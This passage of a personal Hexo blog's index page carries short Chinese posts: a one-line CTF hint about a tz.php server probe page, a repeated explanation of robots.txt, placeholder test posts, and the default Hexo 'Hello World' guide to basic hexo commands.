<p>看到探针，url+tz.php</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/13/ctfshow%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cm9qgphqq000600uo44675j0c" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="ctfshow-robots.txt" class="h-entry article article-type-ctfshow" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/13/robots.txt/" class="article-date">
  <time class="dt-published" datetime="2025-04-13T07:03:22.000Z" itemprop="datePublished">2025-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/13/robots.txt/">信息收集</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。即，Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br>robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/13/robots.txt/" data-id="cm9qgphqr000700uocq7badb4" data-title="信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="ctfshow-信息收集" class="h-entry article article-type-ctfshow" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
  <time class="dt-published" datetime="2025-04-13T07:03:22.000Z" itemprop="datePublished">2025-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">robots.txt</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。即，Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br>robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cm9qgphr1000k00uo1e4vf8lu" data-title="robots.txt" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/13/blog/" class="article-date">
  <time class="dt-published" datetime="2025-04-13T06:59:17.000Z" itemprop="datePublished">2025-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/13/blog/">blog</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>22222</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/13/blog/" data-id="cm9qgphql000000uo212o29lw" data-title="blog" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-My-New-Blog-Post" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/09/My-New-Blog-Post/" class="article-date">
  <time class="dt-published" datetime="2025-04-09T09:35:49.000Z" itemprop="datePublished">2025-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/09/My-New-Blog-Post/">My New Blog Post</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>111111</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/09/My-New-Blog-Post/" data-id="cm9qgphqn000100uo189zbjrz" data-title="My New Blog Post" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/07/hello-world/" class="article-date">
  <time class="dt-published" datetime="2025-04-07T12:44:16.882Z" itemprop="datePublished">2025-04-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/07/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/07/hello-world/" data-id="cm9qgphqr000800uobu8gcfh3" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">April 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/">requests库的学习</a>
          </li>
        
          <li>
            <a href="/2025/04/13/ctfshow29-52/">ctfshow29-52</a>
          </li>
        
          <li>
            <a href="/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/04/13/ctfshow%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/04/13/robots.txt/">信息收集</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>